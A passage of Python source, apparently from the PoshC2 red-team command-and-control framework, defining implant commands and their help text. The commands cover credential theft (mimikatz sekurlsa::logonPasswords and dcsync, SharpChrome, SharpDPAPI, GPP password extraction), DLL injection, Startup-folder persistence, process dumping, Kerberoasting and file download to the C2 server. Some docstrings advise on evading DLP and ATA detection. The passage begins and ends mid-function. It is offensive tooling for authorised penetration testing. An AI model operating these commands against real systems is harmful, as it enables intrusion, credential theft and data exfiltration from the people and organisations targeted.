                c2_server.insecure,
                c2_server.user_agent,
                c2_server.referer,
                f"{get_new_implant_url()}?d",
                PayloadsDirectory,
                powershell_proxy_command=powershell_proxy_command,
                url_id=url.id
            )

            new_payload.ps_dropper = new_payload.ps_dropper.replace(f"$pid;{upstream_url}",
                                                                    f"$pid;{host_implant.user}@{host_implant.domain}")
            new_payload.create_droppers(f"{name}_")
            new_payload.create_raw(f"{name}_")
            new_payload.create_shellcode(f"{name}_")
            new_payload.create_donut_shellcode(f"{name}_")
            new_payload.create_dynamic_payloads(f"{name}_")
            print_good(f"Created new {name} daisy payloads")


@command(commands, commands_help, examples, block_help, tags=[Tag.Help])
def do_help(user, command, implant_id, command_prefix=""):
    """
    Displays a list of all the available commands for this implant, or
    help for a particular command if specified.

    MITRE TTPs:
        {}

    Examples:
        help
        help list-modules
        help inject-shellcode
    """
    print_command_help(command, commands, commands_help, block_help)


@command(commands, commands_help, examples, block_help, tags=[Tag.Help])
def do_search_help(user, command, implant_id, command_prefix=""):
    """
    Search the command list for commands containing the keyword.

    The search is case insensitive.
    The -verbose option will search within and print the help for each command also.

    MITRE TTPs:
        {}

    Examples:
        search-help psexec
        search-help -verbose psexec
    """
    search_help(command, commands_help)


@command(commands, commands_help, examples, block_help, tags=[Tag.Comms, Tag.Util])
def do_turtle(user, command, implant_id, command_prefix=""):
    """
    Turtle the implant for a set period of time, preventing any beacons for the provided period.

    Once the time period has expired, the implant will resume beaconing.

    MITRE TTPs:
        {}

    Examples:
        turtle 30s
        turtle 10m
        turtle 12h
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Comms, Tag.Data_Gathering])
def do_ssl_inspection_check(user, command, implant_id, command_prefix=""):
    """
    Return the certificate metadata from the HTTPS server on the specified URL.

    Accepts proxy arguments.

    MITRE TTPs:
        {}

    Examples:
        ssl-inspection-check https://www.google.com <proxyhost> <proxyuser> <proxypass> <useragent>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util, Tag.Comms])
def do_get_rotation(user, command, implant_id, command_prefix=""):
    """
    Display any applicable URL rotation information.

    MITRE TTPs:
        {}

    Examples:
        get-rotation
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Filesystem, Tag.Opsec])
def do_posh_delete(user, command, implant_id, command_prefix=""):
    """
    Securely deletes a file passed as an argument.

    Should make retrievable harder due to overwriting.

    Accepts UNC paths.

    MITRE TTPs:
        {}

    Examples:
        posh-delete C:\\users\\public\\test.txt
        posh-delete \\Server01\\C$\\Temp\\posh.dll
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Filesystem], name="cat")
def do_get_content(user, command, implant_id, command_prefix=""):
    """
    Prints the contents of a file to the C2 log.

    Does not support 0x00 characters (as found in LNK files).

    MITRE TTPs:
        {}

    Examples:
        gc "C:\\users\\public\\myfile.txt"
        get-content "C:\\users\\public\\myfile.txt"
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_user_info(user, command, implant_id, command_prefix=""):
    """
    Returns information on last boot time, local users and group memberships using local queries.

    If running with a correct domain context, will also return information about the current user
    and the domain password policy.

    MITRE TTPs:
        {}

    Examples:
        get-user_info
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_dodgy_processes(user, command, implant_id, command_prefix=""):
    """
    Returns 'interesting' processes such as AV products and EDRs.

    For a comprehensive look at what EDR and defensive software is present, use SeatBelt and SharpEDRChecker.

    MITRE TTPs:
        {}

    Examples:
        get-dodgy-processes
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_pslo(user, command, implant_id, command_prefix=""):
    """
    Loads a PowerShell module into memory for use with sharpps.

    Will also load the PowerShell wrapper and System.Management.Automation.dll into
    memory on the implant if not already present.

    Consider your host process before using this within more mature organisations.

    MITRE TTPs:
        {}

    Examples:
        pslo PowerView_dev.ps1
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpedrchecker(user, command, implant_id, command_prefix=""):
    """
    Runs SharpEDRChecker to check for EDRs and security tooling.

    https://github.com/PwnDexter/SharpEDRChecker

    MITRE TTPs:
        {}

    Examples:
        sharpedrchecker
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpps(user, command, implant_id, command_prefix=""):
    """
    Gives access to previously loaded PowerShell functionality.

    Will load the PowerShell wrapper and System.Management.Automation.dll into
    memory on the implant if not already present.

    Use pslo to load PowerShell modules.

    MITRE TTPs:
        {}

    Examples:
        sharpps Get-NetUser bob
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_runas(user, command, implant_id, command_prefix=""):
    """
    Gives command execution in the context of a different user using CreateProcessWithLogonW.

    MITRE TTPs:
        {}

    Examples:
        runas <user> <password> <os command> <domain> <timeout> <logontype>
        runas bob Password123 whoami domain.local <optional timeout in seconds> <valid logontype (2,3 etc)
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_resolve_ip(user, command, implant_id, command_prefix=""):
    """
    Uses the locally configured DNS server to perform a DNS lookup.

    Returns a hostname.

    MITRE TTPs:
        {}

    Examples:
        resolve-ip 192.168.1.10
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_resolve_dns_name(user, command, implant_id, command_prefix=""):
    """
    Uses the locally configured DNS server to perform a reverse DNS lookup.

    Don't supply any protocol information.
    Returns an IP.

    MITRE TTPs:
        {}

    Examples:
        resolve-dns-name google.com
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_inveigh(user, command, implant_id, command_prefix=""):
    """
    Loads InveighZero into memory and runs it with the default options.

    InveighZero will detect whether it is elevated or not and act accordingly.

    Runs as a background task and will post back output upon each beacon.

    Use stopinveigh to stop it.

    https://github.com/Kevin-Robertson/InveighZero

    MITRE TTPs:
        {}

    Examples:
        inveigh
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_stop_inveigh(user, command, implant_id, command_prefix=""):
    """
    Stops the Inveigh background job from running.

    Does not remove the assembly from memory.

    MITRE TTPs:
        {}

    Examples:
        stop-inveigh
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_stop_socks(user, command, implant_id, command_prefix=""):
    """
    Stops SharpSocks.

    MITRE TTPs:
        {}

    Examples:
        stop-socks
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_installer_info(user, command, implant_id, command_prefix=""):
    """
    Gets installer info.

    MITRE TTPs:
        {}

    Examples:
        get-installer-info
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_gpp_password(user, command, implant_id, command_prefix=""):
    """
    Extracts the Group Policy Password, if possible.

    MITRE TTPs:
        {}

    Examples:
        get-gpp-password
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_stickynotes_extract(user, command, implant_id, command_prefix=""):
    """
    Extracts information stored in Windows StickyNotes.

    MITRE TTPs:
        {}

    Examples:
        stickynotes-extract
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_stickynotes_persist(user, command, implant_id, command_prefix=""):
    """
    # TODO

    MITRE TTPs:
        {}

    Examples:
        stickynotes-persist
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpapplocker(user, command, implant_id, command_prefix=""):
    """
    Enumerates local AppLocker configuration on the target.

    Takes a variety of arguments but -e is likely to be the most effective.

    https://github.com/Flangvik/SharpAppLocker/

    MITRE TTPs:
        {}

    Examples:
        sharpapplocker -l (queries local AppLocker config)
        sharpapplocker -e (queries effective AppLocker config - mixture of domain and local settings). Will crash implant if AppLocker NOT enabled.
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_lockless(user, command, implant_id, command_prefix=""):
    """
    Copy files that are open and locked.

    https://github.com/GhostPack/Lockless

    MITRE TTPs:
        {}

    Examples:
        lockless <path to file> (will return a process)
        lockless <path to file> /process:<process doing the locking /copy:<path to output file (optional)>
        lockless.exe WebCacheV01.dat /process:taskhostw /copy:C:\\Temp\\out.tmp
        lockless all (displays all open handles)
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_load_powerstatus(user, command, implant_id, command_prefix=""):
    """
    Loads the powerstatus monitoring DLL into memory.

    This is loaded by default for Sharp Implants.

    MITRE TTPs:
        {}

    Examples:
        load-powerstatus
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_powerstatus(user, command, implant_id, command_prefix=""):
    """
    Displays the last known power status in the implant handler, and queries the implant for power status on next beacon.

    MITRE TTPs:
        {}

    Examples:
        get-powerstatus
    """
    get_powerstatus(implant_id)
    command = "run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_create_startuplnk(user, command, implant_id, command_prefix=""):
    """
    Creates an LNK in the currently logged on user Startup directory.

    Consider your host process before writing to disk.

    MITRE TTPs:
        {}

    Examples:
        create-startuplnk test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_create_lnk(user, command, implant_id, command_prefix=""):
    """
    Creates an LNK in the specified directory.

    Consider your host process before writing to disk.

    MITRE TTPs:
        {}

    Examples:
        create-lnk c:\\users\\public\\test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
        create-lnk <path to drop LNK> <path to exe / rundll32> <any args required (eg dll etp)>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_start_shortcut(user, command, implant_id, command_prefix=""):
    """
    Simulates a user clicking on the shortcut you have created.

    Useful for testing your Startup persistence or similar.

    MITRE TTPs:
        {}

    Examples:
        start-shortcut c:\\users\\public\\image.lnk
        start-shortcut <path to LNK>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_run_exe_background(user, command, implant_id, command_prefix=""):
    """
    Run your EXE in memory as a background task, with output posted back upon each beacon.

    Need to specify all arguments.

    The entrypoint is assumed to be Main.

    The module must be loaded with load-module first.

    Useful with, for example, Inveigh or Rubeus monitor mode.

    MITRE TTPs:
        {}

    Examples:
        run-exe-background Core.Program Core runmylongapp
        run-exe-background Rubeus.Program Rubeus monitor /interval:5 /filteruser:DC01$
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_run_dll_background(user, command, implant_id, command_prefix=""):
    """
    Run your DLL in memory as a background task, with output posted back upon each beacon.

    Need to specify all arguments & the entry point.

    The module must be loaded with load-module first.

    Useful with, for example, Inveigh or Rubeus monitor mode.

    MITRE TTPs:
        {}

    Examples:
        run-dll-background Core.Program Core runmylongll
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_run_dll(user, command, implant_id, command_prefix=""):
    """
    Run your DLL in memory.

    Need to specify all arguments & the entry point.

    The module must be loaded with load-module first.

    MITRE TTPs:
        {}

    Examples:
        run-dll SharpSploit.Credentials.Mimikatz SharpSploit Command "\"lsadump::dcsync /user:administrator\""
        run-dll SharpSploit.Enumeration.Host SharpSploit GetHostname
        run-dll SharpSploit.Enumeration.Host SharpSploit GetProcessList
        run-dll Seatbelt.Program Seatbelt UserChecks
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_run_exe(user, command, implant_id, command_prefix=""):
    """
    Run your EXE in memory.

    Need to specify all arguments.

    The entrypoint is assumed to be Main.

    The module must be loaded with load-module first.

    MITRE TTPs:
        {}

    Examples:
        run-exe <FullyQualifiedClassWithMainMethod> <MyBinaryAssemblyName> (load-module MyBinary.exe first)
        run-exe Core.Program Core
        run-exe Rubeus.Program Rubeus klist
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="mv")
def do_move(user, command, implant_id, command_prefix=""):
    """
    Move a file from A to B.

    Uses inbuilt .NET code and does not call shell commands.

    MITRE TTPs:
        {}

    Examples:
        move c:\\temp\\old.exe c:\\temp\\new.exe
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="cp")
def do_copy(user, command, implant_id, command_prefix=""):
    """
    Copy a file from A to B.

    Uses inbuilt .NET code and does not call shell commands.

    MITRE TTPs:
        {}

    Examples:
        copy:\\temp\\test.exe c:\\temp\\test.bak
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_ls(user, command, implant_id, command_prefix=""):
    """
    List a directory.

    Includes hidden and system files.

    MITRE TTPs:
        {}

    Examples:
        ls C:\\users\\public
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_ls_recurse(user, command, implant_id, command_prefix=""):
    """
    List a directory recursively.

    Includes hidden and system files - eg listing C:\\ will result in a large amount of output.

    MITRE TTPs:
        {}

    Examples:
        ls-recurse C:\\users\\public
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="rm")
def do_del(user, command, implant_id, command_prefix=""):
    """
    Delete a file.

    Not secure - use posh-delete if required.

    MITRE TTPs:
        {}

    Examples:
        del C:\\users\\jbloggs\\desktop\\test.txt
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_ls_pipes(user, command, implant_id, command_prefix=""):
    """
    List all listening pipes on the local machine.

    Handy for checking PBind shellcode execution.

    MITRE TTPs:
        {}

    Examples:
        ls-pipes
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_ls_remote_pipes(user, command, implant_id, command_prefix=""):
    """
    List all listening pipes on the remote machine.

    Handy for checking PBind shellcode execution.

    Requires correct accesses (Kerberos tickets or correct token).

    MITRE TTPs:
        {}

    Examples:
        ls-remote-pipes dc01
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_test_ad_credential(user, command, implant_id, command_prefix=""):
    """
    Tests the provided credentials against the domain.

    Creates a new PrincipalContext (with ContextType.Domain)
    and attempts to ValidateContext against the domain.

    4624 events are generated.

    MITRE TTPs:
        {}

    Examples:
        test-ad-credential Domain Username Password
        test-ad-credential Domain.fqdn Username Password
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_test_local_credential(user, command, implant_id, command_prefix=""):
    """
    Tests the provided credentials against the local machine.

    Creates a new PrincipalContext (with ContextType.Machine) and attempts to
    ValidateContext against the local machine.

    MITRE TTPs:
        {}

    Examples:
        test-local-credential Username Password
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_inject_dll(user, command, implant_id, command_prefix=""):
    """
    Injects a DLL from on disk on the C2 server into the target process
    via CreateRemoteThread.

    Analogous to dllinject within Cobalt Strike.

    MITRE TTPs:
        {}

    Examples:
        inject-dll <dll-location> <pid/path> <ppid>
        inject-dll c:\\temp\\test.dll c:\\windows\\system32\\svchost.exe <optional-ppid-spoof>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_download_file(user, command, implant_id, command_prefix=""):
    """
    Download the target file to the C2 server.

    Will chunk larger files to ~100MB.

    These large downloads may trigger DLP or proxy warnings, so give consideration to splitting
    a large file up on the target filesystem etc.

    MITRE TTPs:
        {}

    Examples:
        download-file C:\\users\\public\\file.txt
    """
    destination = command.replace("download-file ", "")
    b64_destination = base64.b64encode(destination.encode("utf-8")).decode("utf-8")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} download-file {b64_destination}" if command_prefix else f"download-file {b64_destination}",
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_ps(user, command, implant_id, command_prefix=""):
    """
    Show running processes on the local machine.

    Alias from get-processlist.

    MITRE TTPs:
        {}

    Examples:
        ps
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_remote_process_listing(user, command, implant_id, command_prefix=""):
    """
    Uses WMI to query a remote machine for running processes. Can filter on a process name.

    Not case sensitive, and will return what user context and PID the target process is running under.

    Appropriate token or Kerberos ticket required.

    Returns the user context and PID the application is running under.

    Can take multiple computers.

    MITRE TTPs:
        {}

    Examples:
        get-remote-process-listing win7-client2 explorer.exe
        get-remote-process-listing SERVER01,SERVER02,SERVER03 taskhost.exe
        get-remote-process-listing SERVER01
    """
    if len(command.split()) > 2:
        new_task = NewTask(
            implant_id=implant_id,
            command=f"{command_prefix} {command}" if command_prefix else command,
            user=user,
            child_implant_id=None
        )
    else:
        command = f"get-remote-process-listing-all {' '.join(command.split()[1:])}"
        new_task = NewTask(
            implant_id=implant_id,
            command=f"{command_prefix} {command}" if command_prefix else command,
            user=user,
            child_implant_id=None
        )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_safetydump(user, command, implant_id, command_prefix=""):
    """
    Creates a process dump of a target process that can be downloaded.

    https://github.com/m0rv4i/SafetyDump

    See also Dumpert by Outflank.

    MITRE TTPs:
        {}

    Examples:
        safetydump <pid>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpchrome(user, command, implant_id, command_prefix=""):
    """
    SharpChrome from Ghostpack.

    https://github.com/GhostPack/SharpDPAPI/tree/master/SharpChrome

    Polls the local Google Chrome database and DPAPI to decrypt any credentials. Pair with SharpWeb and Chlonium from Rich Warren at NCC.

    MITRE TTPs:
        {}

    Examples:
        sharpchrome logins
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpdpapi(user, command, implant_id, command_prefix=""):
    """
    SharpDPAPI from Ghostpack.

    Uses DPAPI to decrypt credential blobs.

    https://github.com/GhostPack/SharpDPAPI

    MITRE TTPs:
        {}

    Examples:
        sharpdpapi machinetriage
        sharpdpapi triage
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpup(user, command, implant_id, command_prefix=""):
    """
    Runs SharpUp from GhostPack.

    https://github.com/GhostPack/SharpUp

    Consider https://github.com/itm4n/PrivescCheck instead (although requires PS)

    MITRE TTPs:
        {}

    Examples:
        sharpup all
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpweb(user, command, implant_id, command_prefix=""):
    """
    Runs SharpWeb to pull logins from Chrome.

    Consider pairing with SharpDPAPI and Chlonium.

    https://github.com/djhohnstein/SharpWeb

    MITRE TTPs:
        {}

    Examples:
        sharpweb all

    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_seatbelt(user, command, implant_id, command_prefix=""):
    """
    Runs Seatbelt for Situational Awareness.

    https://github.com/GhostPack/Seatbelt

    MITRE TTPs:
        {}

    Examples:
        seatbelt -group=all
        seatbelt -group=chrome
        seatbelt -group=miscsharpweb all
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_mimikatz(user, command, implant_id, command_prefix=""):
    """
    Runs Mimikatz via reflectively loading in SharpSploit.

    https://github.com/cobbr/SharpSploit
    https://github.com/gentilkiwi/mimikatz

    MITRE TTPs:
        {}

    Examples:
        mimikatz Wdigest
        mimikatz LsaSecrets
        mimikatz LsaCache
        mimikatz SamDump
        mimikatz Command "privilege::debug sekurlsa::logonPasswords"
        mimikatz Command Command "\"lsadump::dcsync /user:administrator\""
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharpview(user, command, implant_id, command_prefix=""):
    """
    Uses SharpView to enumerate the domain / remote machines.

    HEALTH WARNING: Casing is critical. Test ALL commands in lab first as will return ALL objects and properties if you typo.

    https://github.com/tevora-threat/SharpView

    MITRE TTPs:
        {}

    Examples:
        sharpview Get-NetUser -SamAccountName ben
        sharpview Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
        sharpview Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
        sharpview Get-NetUser -Name deb -Domain blorebank.local
        sharpview Get-NetSession -Domain blorebank.local
        sharpview Get-NetOU -Properties distinguishedname
        sharpview Get-DomainController -Domain blorebank.local
        sharpview Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
        sharpview Get-DomainUser -AdminCount -Properties samaccountname
        sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
        sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
        sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
        sharpview Get-DomainComputer -SearchBase "OU=Domain Controllers,DC=contoso,DC=local" -Properties samaccountname
        sharpview Get-NetShare -ComputerName SERVER01
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_portscan(user, command, implant_id, command_prefix=""):
    """
    Loads the PortScanner.dll into memory and uses TCP Connect to scan the target.

    Consider intermediary firewalls and logging devices.

    MITRE TTPs:
        {}

    Examples:
        portscan "10.0.0.1-50" "1-65535" 1 100
        portscan <hosts> <ports> <delay-in-seconds> <max-threads>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_oraclecli(user, command, implant_id, command_prefix=""):
    """
    Interact with a remote Oracle instance.

    Consider the impact of any queries (eg SELECT * from * is probably not ideal).

    MITRE TTPs:
        {}

    Examples:
        oraclecli -server server01 -sn orcl -user SCOTT -pass TIGER -query "SELECT * FROM V$VERSION"
        oraclecli -server <hostname -sn <storage node/SID> -user <user> -pass <pass> -query "SELECT * FROM V$VERSION"
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_rubeus(user, command, implant_id, command_prefix=""):
    """
    Loads Rubeus into memory.

    https://github.com/GhostPack/Rubeus

    Consider using OverPassTheHash where possible (eg pass NTLM/keys to get Kerberos tickets, rather than PTH directly using NTLM).
    Avoid ATA detection for 'Unusual Protocol Implementation' by passing in all keys / hashes given from a DCSync.

    MITRE TTPs:
        {}

    Examples:
        rubeus kerberoast
        rubeus asreproast /user:username
        rubeus s4u /user:<user or computeraccount$> /rc4:<ntlm> /impersonateuser:administrator /msdsspn:LDAP/<fqdn> /dc:dc01.fqdn.local /altservice:cifs,host,LDAP /ptt
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_sharphound(user, command, implant_id, command_prefix=""):
    """
    Loads SharpHound into memory and executes with the given syntax.

    https://github.com/BloodHoundAD/BloodHound

    MITRE TTPs:
        {}

    Examples:
        sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,DCOnly --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_small.zip --collectallproperties
        sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,Session,LoggedOn,Default --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_full.zip --collectallproperties
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

